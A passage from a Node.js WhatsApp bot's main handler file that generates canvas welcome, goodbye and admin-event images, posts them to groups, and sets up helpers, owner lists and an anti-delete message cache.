const fs = require("fs");
const path = require("path");
const axios = require("axios");
const yts = require("yt-search");
const version = "3.0.0";
const chalk = require("chalk");
const crypto = require("crypto");
const ffmpeg = require("fluent-ffmpeg");
const { PassThrough } = require("stream");
const baileys = require("@whiskeysockets/baileys");
const { exec } = require("child_process");
const fetch = global.fetch || require("node-fetch");
const { loadJSON, saveJSON, runtime, formatBytes } = require("./helper/function.js");
const config = require("./settings.js");
const { requestPairingCode } = require("./whatsapp.js");
const { validatePhoneNumber } = require("./helper/generate.js");
const logger = require("./helper/logger.js");
const { logSystem } = require('./helper/logger.js'); // Adjust path as needed
const { logIncomingMessage, logGroupCommand } = require("./lib/chatLogger");
const { syncRemoteCommands, getRemoteCommand, listRemoteCommands, runRemoteCommand, getRemoteStatus } = require("./lib/remoteCommands.js");
const { getMzaziApiKey, getSetting } = require("./lib/settings");
const { db, saveDB } = require("./lib/database");
const {
  PAIRING_COMMAND,
  getWhatsappUserId,
  resolveWhatsappAccountId,
  getPlanSummary,
  getWhatsappSubscription,
  createWhatsappPayment,
  verifyWhatsappPayment,
  canAddDevice,
  syncSessionToDb,
  PLANS,
} = require("./lib/whatsappBilling");
const os = require("os");
const { downloadMediaMessage, generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

const pino = require("pino");
const { sendButtonMessage } = require("./lib/buttons");

// ═══════════════════════════════════════════════════════════════════════════
// CANVAS — GROUP EVENT IMAGE GENERATOR
// Generates cute professional images for welcome, goodbye, and group events.
// Falls back to text if the 'canvas' package is not installed.
// ═══════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════
// CANVAS — GROUP EVENT IMAGE GENERATOR
// Generates cute professional images for welcome, goodbye, and group events.
// Falls back to text if the 'canvas' package is not installed.
// ═══════════════════════════════════════════════════════════════════════════
let _createCanvas = null;
let _loadImage = null;
try {
  const _canvasMod = require("canvas");
  _createCanvas = _canvasMod.createCanvas;
  _loadImage = _canvasMod.loadImage;
} catch {}

function _roundedRect(ctx, x, y, w, h, r) {
  ctx.beginPath();
  ctx.moveTo(x + r, y); ctx.lineTo(x + w - r, y);
  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
  ctx.lineTo(x + w, y + h - r);
  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  ctx.lineTo(x + r, y + h);
  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
  ctx.lineTo(x, y + r);
  ctx.quadraticCurveTo(x, y, x + r, y);
  ctx.closePath();
}

function _truncate(str, max) {
  return str && str.length > max ? str.slice(0, max) + "…" : str || "";
}

function _drawAvatarFallback(ctx, cx, cy, radius, accent) {
  const grad = ctx.createRadialGradient(cx, cy - radius * 0.15, radius * 0.1, cx, cy, radius);
  grad.addColorStop(0, "#1e2a1e"); grad.addColorStop(1, "#0a120a");
  ctx.fillStyle = grad; ctx.fill();
  ctx.globalAlpha = 0.65; ctx.fillStyle = accent;
  ctx.beginPath(); ctx.arc(cx, cy - radius * 0.18, radius * 0.36, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.ellipse(cx, cy + radius * 0.52, radius * 0.52, radius * 0.38, 0, Math.PI, 0); ctx.fill();
  ctx.globalAlpha = 1;
}



async function _drawAvatar(ctx, cx, cy, radius, profilePicUrl, accent) {
  ctx.save();
  ctx.shadowColor = accent;
  ctx.shadowBlur = 28;
  ctx.beginPath(); ctx.arc(cx, cy, radius + 6, 0, Math.PI * 2);
  ctx.strokeStyle = accent; ctx.lineWidth = 3.5; ctx.stroke();
  ctx.shadowBlur = 0;
  ctx.beginPath(); ctx.arc(cx, cy, radius, 0, Math.PI * 2); ctx.closePath(); ctx.clip();
  if (profilePicUrl && _loadImage) {
    try {
      const img = await _loadImage(profilePicUrl);
      ctx.drawImage(img, cx - radius, cy - radius, radius * 2, radius * 2);
    } catch { _drawAvatarFallback(ctx, cx, cy, radius, accent); }
  } else {
    _drawAvatarFallback(ctx, cx, cy, radius, accent);
  }
  ctx.restore();
}

function _drawBrandFooter(ctx, W, y, botName, accent) {
  ctx.globalAlpha = 0.14; ctx.strokeStyle = "#ffffff"; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(120, y - 14); ctx.lineTo(W - 120, y - 14); ctx.stroke();
  ctx.globalAlpha = 1;
  ctx.font = "italic 13px Arial"; ctx.fillStyle = "rgba(255,255,255,0.4)"; ctx.textAlign = "center";
  ctx.fillText(`🤖 ${botName}  •  Mzazi Tech Inc`, W / 2, y);
}

async function generateWelcomeImage({ memberNumber, groupName, memberCount, profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 570;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const A = "#1fdb7e", A2 = "#00ffaa";
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, "#051810"); bg.addColorStop(0.5, "#0c3820"); bg.addColorStop(1, "#051810");
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = A;
  ctx.beginPath(); ctx.arc(720, 80, 160, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(70, 490, 120, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.09; ctx.fillStyle = "#ffffff";
  [[55,55,2.5],[195,28,1.5],[620,28,2],[752,62,1.5],[38,200,1],[782,195,1.5],
   [88,400,2],[712,430,1.5],[400,18,2],[350,555,1.5],[650,510,1],[130,530,1.2]]
    .forEach(([dx,dy,dr]) => { ctx.beginPath(); ctx.arc(dx,dy,dr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, A); bar.addColorStop(0.5, A2); bar.addColorStop(1, A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke();
  ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 148, 82, profilePicUrl, A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, A); tg.addColorStop(0.5, A2); tg.addColorStop(1, A);
  ctx.font = "bold 58px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = "rgba(0,220,100,0.45)"; ctx.shadowBlur = 20;
  ctx.fillText("🎉  WELCOME!", W / 2, 295); ctx.shadowBlur = 0;

  ctx.font = "bold 27px Arial"; ctx.fillStyle = "#ffffff";
  ctx.fillText(`+${memberNumber}`, W / 2, 335);

  const bW = 290, bH = 36, bX = (W - bW) / 2, bY = 352;
  ctx.globalAlpha = 0.22; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = A; ctx.fill();
  ctx.globalAlpha = 0.45; ctx.strokeStyle = A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 15px Arial"; ctx.fillStyle = A2;
  ctx.fillText("✅   JOINED THE GROUP", W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 406); ctx.lineTo(W - 160, 406); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.85)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 440);

  ctx.font = "bold 16px Arial"; ctx.fillStyle = A;
  ctx.fillText(`👥  Member #${memberCount}`, W / 2, 474);

  ctx.font = "14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.32)";
  ctx.fillText("We are so glad to have you here ✨", W / 2, 502);

  _drawBrandFooter(ctx, W, 534, botName, A);

  return canvas.toBuffer("image/png");
}

async function generateGoodbyeImage({ memberNumber, groupName, profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 540;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const A = "#e94560", A2 = "#ff6b8a";
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, "#0e0c1e"); bg.addColorStop(0.5, "#1a1438"); bg.addColorStop(1, "#0e0c1e");
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = A;
  ctx.beginPath(); ctx.arc(700, 80, 150, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(80, 470, 110, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.12; ctx.fillStyle = "#ffffff";
  [[78,48,2.5],[198,76,1.5],[352,36,2],[502,68,1.5],[658,36,2.5],[742,88,1.5],
   [142,400,1.5],[302,418,2],[482,440,1.5],[618,408,2],[718,388,1.5],[58,235,1],[775,225,1.5]]
    .forEach(([sx,sy,sr]) => { ctx.beginPath(); ctx.arc(sx,sy,sr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, A); bar.addColorStop(0.5, A2); bar.addColorStop(1, A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke(); ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 140, 78, profilePicUrl, A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, A); tg.addColorStop(0.5, A2); tg.addColorStop(1, A);
  ctx.font = "bold 56px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = "rgba(233,69,96,0.5)"; ctx.shadowBlur = 20;
  ctx.fillText("🌙  GOODBYE...", W / 2, 278); ctx.shadowBlur = 0;

  ctx.font = "bold 27px Arial"; ctx.fillStyle = "#ffffff";
  ctx.fillText(`+${memberNumber}`, W / 2, 316);

  const bW = 280, bH = 36, bX = (W - bW) / 2, bY = 333;
  ctx.globalAlpha = 0.2; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = A; ctx.fill();
  ctx.globalAlpha = 0.4; ctx.strokeStyle = A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 15px Arial"; ctx.fillStyle = A2;
  ctx.fillText("👋   LEFT THE GROUP", W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 385); ctx.lineTo(W - 160, 385); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.82)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 418);

  ctx.font = "italic 14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.34)";
  ctx.fillText("Thank you for being part of our family 💙", W / 2, 452);
  ctx.fillText("Until we meet again... 🌠", W / 2, 474);

  _drawBrandFooter(ctx, W, 506, botName, A);

  return canvas.toBuffer("image/png");
}

async function generateEventImage({ memberNumber, eventType, groupName, details = "", profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 540;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const THEMES = {
    promote:     { bg:["#120a28","#261650","#120a28"], A:"#f0c040", A2:"#ffd700", badge:"👑   PROMOTED TO ADMIN",    title:"PROMOTED!" },
    demote:      { bg:["#200e00","#3e1c00","#200e00"], A:"#ff8c42", A2:"#ffa760", badge:"📉   ADMIN RIGHTS REMOVED",  title:"DEMOTED"   },
    remove:      { bg:["#180000","#300000","#180000"], A:"#e94560", A2:"#ff6b8a", badge:"🚪   REMOVED FROM GROUP",    title:"REMOVED"   },
    add:         { bg:["#051810","#0c3820","#051810"], A:"#1fdb7e", A2:"#00ffaa", badge:"✅   JOINED THE GROUP",      title:"JOINED!"   },
    description: { bg:["#090f28","#10204a","#090f28"], A:"#5b9fff", A2:"#7eb8ff", badge:"📝   DESCRIPTION UPDATED",  title:"INFO UPDATE"},
    subject:     { bg:["#180e00","#2e1c00","#180e00"], A:"#ffcc44", A2:"#ffe066", badge:"✏️   GROUP RENAMED",         title:"RENAMED"   },
    default:     { bg:["#090f28","#101e3c","#090f28"], A:"#4a9fff", A2:"#73b4ff", badge:"📢   GROUP EVENT",           title:"UPDATE"    },
  };
  const t = THEMES[eventType] || THEMES.default;

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, t.bg[0]); bg.addColorStop(0.5, t.bg[1]); bg.addColorStop(1, t.bg[2]);
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = t.A;
  ctx.beginPath(); ctx.arc(700, 80, 150, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(80, 470, 110, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.1; ctx.fillStyle = "#ffffff";
  [[50,48,2.5],[190,26,1.5],[630,24,2],[752,58,1.5],[38,208,1],[782,198,1.5],[78,408,2],[718,418,1.5]]
    .forEach(([px,py,pr]) => { ctx.beginPath(); ctx.arc(px,py,pr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, t.A); bar.addColorStop(0.5, t.A2); bar.addColorStop(1, t.A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = t.A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke(); ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 140, 76, profilePicUrl, t.A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, t.A); tg.addColorStop(0.5, t.A2); tg.addColorStop(1, t.A);
  ctx.font = "bold 54px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = t.A + "88"; ctx.shadowBlur = 20;
  ctx.fillText(t.title, W / 2, 278); ctx.shadowBlur = 0;

  if (memberNumber) {
    ctx.font = "bold 26px Arial"; ctx.fillStyle = "#ffffff";
    ctx.fillText(`+${memberNumber}`, W / 2, 316);
  }

  const bW = 320, bH = 36, bX = (W - bW) / 2, bY = memberNumber ? 333 : 316;
  ctx.globalAlpha = 0.2; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = t.A; ctx.fill();
  ctx.globalAlpha = 0.4; ctx.strokeStyle = t.A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 14px Arial"; ctx.fillStyle = t.A2;
  ctx.fillText(t.badge, W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = t.A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 390); ctx.lineTo(W - 160, 390); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.82)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 424);

  if (details && details !== t.badge) {
    ctx.font = "italic 14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.38)";
    ctx.fillText(_truncate(details, 60), W / 2, 456);
  }

  ctx.font = "13px Arial"; ctx.fillStyle = "rgba(255,255,255,0.25)";
  ctx.fillText(new Date().toLocaleString(), W / 2, 476);

  _drawBrandFooter(ctx, W, 506, botName, t.A);

  return canvas.toBuffer("image/png");
}

// ── Group participant event handler (register in whatsapp.js) ────────────────
// mzazi.ev.on("group-participants.update", (u) => handleGroupParticipantsUpdate(mzazi, u));
// mzazi.ev.on("groups.update", (u) => handleGroupsUpdateEvent(mzazi, u));

async function handleGroupParticipantsUpdate(mzazi, update) {
  try {
    const { id: groupJid, participants, action } = update;
    if (!groupJid || !participants?.length) return;
    const botPhoneNum = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
    const sessFile = (name) => `./database/sessions/${botPhoneNum}/${name}`;
    const _loadJ = (p, d) => { try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch { return d; } };
    const gs = (_loadJ(sessFile("groups.json"), {}))[groupJid] || {};

    let groupName = groupJid, memberCount = 0;
    try { const meta = await mzazi.groupMetadata(groupJid); groupName = meta.subject || groupJid; memberCount = meta.participants?.length || 0; } catch {}

    for (const participantJid of participants) {
      const memberNumber = participantJid.split("@")[0].split(":")[0].replace(/\D/g, "");

      // Fetch profile picture — silently fall back to null if unavailable
      let profilePicUrl = null;
      try { profilePicUrl = await mzazi.profilePictureUrl(participantJid, "image"); } catch {}

      if (action === "add" && gs.welcome) {
        const caption =
          `╔════════════════════╗\n║   🎉 *WELCOME* 🎉   ║\n╚════════════════════╝\n\n` +
          `✨ @${memberNumber} just joined!\n\n📌 *Group:* ${groupName}\n👥 *Total Members:* ${memberCount}\n\n_We are so glad to have you here!_ 🌟`;
        try {
          const img = await generateWelcomeImage({ memberNumber, groupName, memberCount, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👋 Welcome @${memberNumber}! 🎉`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "remove" && gs.goodbye) {
        const caption =
          `╔════════════════════╗\n║   🌙 *GOODBYE* 🌙   ║\n╚════════════════════╝\n\n` +
          `💔 @${memberNumber} has left.\n\n📌 *Group:* ${groupName}\n\n_Thank you for being with us. Until we meet again..._ 🌠`;
        try {
          const img = await generateGoodbyeImage({ memberNumber, groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👋 Goodbye @${memberNumber}! 💙`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "promote" && gs.events) {
        const caption =
          `╔════════════════════╗\n║  👑 *PROMOTED!* 👑  ║\n╚════════════════════╝\n\n` +
          `⭐ @${memberNumber} has been promoted!\n🎖️ *New Role:* Admin\n\n📌 *Group:* ${groupName}\n\n_Congratulations! 🎉_`;
        try {
          const img = await generateEventImage({ memberNumber, eventType: "promote", groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👑 @${memberNumber} promoted to Admin! 🎉`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "demote" && gs.events) {
        const caption =
          `╔════════════════════╗\n║  📉 *DEMOTED* 📉   ║\n╚════════════════════╝\n\n` +
          `@${memberNumber} has been demoted.\n🔻 *Admin rights removed*\n\n📌 *Group:* ${groupName}`;
        try {
          const img = await generateEventImage({ memberNumber, eventType: "demote", groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `📉 @${memberNumber} demoted from Admin.`, mentions: [participantJid] }).catch(() => {}); }
      }
    }
  } catch (e) { logger.error("[GroupEvents] handleGroupParticipantsUpdate error:", e?.message); }
}

async function handleGroupsUpdateEvent(mzazi, updates) {
  const botPhoneNum = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
  const _loadJ = (p, d) => { try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch { return d; } };
  for (const update of updates) {
    try {
      const groupJid = update.id;
      if (!groupJid) continue;
      const gs = (_loadJ(`./database/sessions/${botPhoneNum}/groups.json`, {}))[groupJid] || {};
      if (!gs.events) continue;
      let groupName = groupJid;
      try { const meta = await mzazi.groupMetadata(groupJid); groupName = meta.subject || groupJid; } catch {}

      if (update.subject !== undefined) {
        const caption = `╔════════════════════╗\n║  ✏️ *RENAMED* ✏️   ║\n╚════════════════════╝\n\n📌 Group name changed to:\n*${update.subject}*`;
        try {
          const img = await generateEventImage({ memberNumber: "", eventType: "subject", groupName: update.subject, details: `Was: ${groupName}` });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption });
          else await mzazi.sendMessage(groupJid, { text: caption });
        } catch { await mzazi.sendMessage(groupJid, { text: caption }).catch(() => {}); }
      }

      if (update.desc !== undefined) {
        const caption = `╔════════════════════╗\n║  📝 *INFO UPDATE* 📝║\n╚════════════════════╝\n\n📌 *Group:* ${groupName}\n\nNew description:\n_${_truncate(update.desc, 200)}_`;
        try {
          const img = await generateEventImage({ memberNumber: "", eventType: "description", groupName, details: _truncate(update.desc, 60) });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption });
          else await mzazi.sendMessage(groupJid, { text: caption });
        } catch { await mzazi.sendMessage(groupJid, { text: caption }).catch(() => {}); }
      }
    } catch (e) { logger.error("[GroupEvents] handleGroupsUpdateEvent error:", e?.message); }
  }
}

// ========================== HELPERS =========================

// ─────────────────────────────────────────────────────────────────────────────
// STICKER COMMAND SYSTEM — STARTUP LOADER
// PLACEMENT: Near the very top of the file, before module.exports handler.
//
// Loads the sticker→command map from disk into memory so every incoming
// message can be matched instantly without a disk read per message.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Strips domain, device suffix (:0, :2, etc.) and non-numeric chars.
 * "123456789:0@s.whatsapp.net" → "123456789"
 * "123456789@g.us"             → "123456789"
 * "123456789@s.whatsapp.net"   → "123456789"
 */
const normalizeJid = (jid = "") => {
  if (!jid || typeof jid !== "string") return "";
  return jid.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
};

const jidToNumber = (jid) => {
  if (!jid || typeof jid !== "string") return "";
  return jid.split("@")[0].split(":")[0];
};

const ensureDir = (dir) => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
};

const URL_REGEX = /(https?:\/\/[^\s]+|wa\.me\/[^\s]+|chat\.whatsapp\.com\/[^\s]+|www\.[^\s]+)/i;

// ========================== DATABASE ==========================
// paidUsers is now per-session — loaded inside handler after botPhoneNum is known
// Legacy global kept as empty fallback so nothing breaks before botPhoneNum resolves
const paidUsers = [];
const savePaidData = () => {};

// ── ANTI-DELETE MESSAGE CACHE ──────────────────────────────────────────────
// Baileys revoke payloads refer to the original message key. Keep the chat,
// participant, and device in the cache key so identical IDs from different
// chats cannot restore the wrong message.
const messageCache = new Map();
const antiDeleteCacheKey = (key = {}, fallbackChatId = "") => [
  key.remoteJid || fallbackChatId || "",
  key.participant || "",
  key.fromMe ? "1" : "0",
  key.id || "",
].join("|");

const findCachedAntiDeleteMessage = (revokedKey = {}) => {
  if (!revokedKey.id) return null;

  const exact = messageCache.get(antiDeleteCacheKey(revokedKey));
  if (exact) return exact;

  // Some Baileys versions omit remoteJid/participant from the revoke key.
  // Search by ID, preferring matching chat and participant when available.
  const matches = [...messageCache.values()].filter((item) => item.key?.id === revokedKey.id);
  if (!matches.length) return null;
  return matches.find((item) =>
    (!revokedKey.remoteJid || item.key.remoteJid === revokedKey.remoteJid) &&
    (!revokedKey.participant || item.key.participant === revokedKey.participant)
  ) || matches[0];
};

const deleteCachedAntiDeleteMessage = (cached) => {
  if (cached?.cacheKey) messageCache.delete(cached.cacheKey);
};

const unwrapAntiDeleteMessage = (message) => {
  let current = message;
  for (let i = 0; i < 4; i += 1) {
    const next = current?.ephemeralMessage?.message ||
      current?.viewOnceMessage?.message ||
      current?.viewOnceMessageV2?.message ||
      current?.viewOnceMessageV2Extension?.message;
    if (!next) break;
    current = next;
  }
  return current || {};
};

setInterval(() => {
  const cutoff = Date.now() - 15 * 60 * 1000;
  for (const [cacheKey, data] of messageCache.entries()) {
    if (data.ts < cutoff) messageCache.delete(cacheKey);
  }
}, 60000);




const owners = loadJSON("./database/owners.json", []);
const saveOwners = () => saveJSON("./database/owners.json", owners);
const getOwners = () => owners;
const addOwner = (num) => {
  if (!owners.includes(num)) {
    owners.push(num);
    saveOwners();
  }
};
const delOwner = (num) => {
  const i = owners.indexOf(num);
  if (i !== -1) {
    owners.splice(i, 1);
    saveOwners();
  }
};

const getBotName = (phoneNum) => {
  if (phoneNum) {
    const s = loadJSON(`./database/sessions/${phoneNum}/botSettings.json`, {});
    if (s.botName) return s.botName;
  }
  return config.botName || "Mzazi";
};

const setBotName = (phoneNum, name) => {
  const dir = `./database/sessions/${phoneNum}`;
  ensureDir(dir);
  const p = `${dir}/botSettings.json`;
  const s = loadJSON(p, {});
  s.botName = name;
  saveJSON(p, s);
};

const getBody = (message) => {
  if (!message) return "";
  const type = Object.keys(message)[0];
  try {
    if (type === "conversation") return message.conversation || "";
    if (type === "extendedTextMessage") return message.extendedTextMessage.text || "";
    if (type === "imageMessage") return message.imageMessage.caption || "";
    if (type === "videoMessage") return message.videoMessage.caption || "";
    if (type === "templateButtonReplyMessage") return message.templateButtonReplyMessage.selectedId || "";
    if (type === "buttonsResponseMessage") return message.buttonsResponseMessage.selectedButtonId || "";
    if (type === "listResponseMessage") return message.listResponseMessage.singleSelectReply?.selectedRowId || "";
    if (type === "interactiveResponseMessage") {
      const ir = message.interactiveResponseMessage;
      if (ir.nativeFlowResponseMessage?.paramsJson) {
        return JSON.parse(ir.nativeFlowResponseMessage.paramsJson).id || "";
      }
      return ir.body || "";
    }
  } catch (e) {
    return "";
  }
  return "";
};

const pickTargetNumber = (m, text) => {
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const quoted = m.message?.extendedTextMessage?.contextInfo?.participant;
  if (mentioned[0]) return jidToNumber(mentioned[0]);
  if (quoted) return jidToNumber(quoted);
  return (text || "").replace(/\D/g, "");
};

// ========== PENDING SONG STORE (in-memory, expires after 2 minutes) ==========
const songRequests = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [jid, data] of songRequests.entries()) {
    if (now - data.timestamp > 120000) songRequests.delete(jid);
  }
}, 30000);

// ========================== MAIN HANDLER ==========================
module.exports = async (mzazi, m) => {
  try {

    // ── GROUP EVENT STUBS ─────────────────────────────────────────────────────
    // Group join / leave / promote / demote / rename events arrive as stub
    // messages where m.message is null — they MUST be handled before the early
    // return below, otherwise they are silently dropped.
    //
    // Stub type reference (@whiskeysockets/baileys):
    //   26 = GROUP_PARTICIPANT_INVITE   27 = GROUP_PARTICIPANT_ADD
    //   28 = GROUP_PARTICIPANT_REMOVE   31 = GROUP_PARTICIPANT_PROMOTE
    //   32 = GROUP_PARTICIPANT_DEMOTE   11 = GROUP_CHANGE_SUBJECT
    //   12 = GROUP_CHANGE_DESCRIPTION
    // ─────────────────────────────────────────────────────────────────────────
    const _STUB = m.messageStubType;
    const _stubGrp = m.key?.remoteJid;
    if (_STUB && _stubGrp && _stubGrp.endsWith("@g.us")) {
      const _botPN3 = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
      const _grpPath = `./database/sessions/${_botPN3}/groups.json`;
      const _gs3 = (() => {
        try { return JSON.parse(fs.readFileSync(_grpPath, "utf8"))[_stubGrp] || {}; }
        catch { return {}; }
      })();

      // Resolve group name + member count (best-effort)
      let _gName3 = _stubGrp, _mCount3 = 0;
      try {
        const _meta3 = await mzazi.groupMetadata(_stubGrp);
        _gName3  = _meta3.subject || _stubGrp;
        _mCount3 = _meta3.participants?.length || 0;
      } catch {}

      const _stubs3 = m.messageStubParameters || [];

      // Helper: send image with text fallback
      const _send3 = async (imgBuf, caption, mentions) => {
        try {
          if (imgBuf) {
            await mzazi.sendMessage(_stubGrp, { image: imgBuf, caption, mentions });
          } else {
            await mzazi.sendMessage(_stubGrp, { text: caption, mentions });
          }
        } catch {
          await mzazi.sendMessage(_stubGrp, { text: caption, mentions }).catch(() => {});
        }
      };



      // ── JOIN (invite or add) ────────────────────────────────────────────
      if ((_STUB === 27 || _STUB === 26) && _gs3.welcome) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║   🎉 *WELCOME* 🎉   ║\n` +
            `╚════════════════════╝\n\n` +
            `✨ @${mn} just joined!\n\n` +
            `📌 *Group:* ${_gName3}\n` +
            `👥 *Total Members:* ${_mCount3}\n\n` +
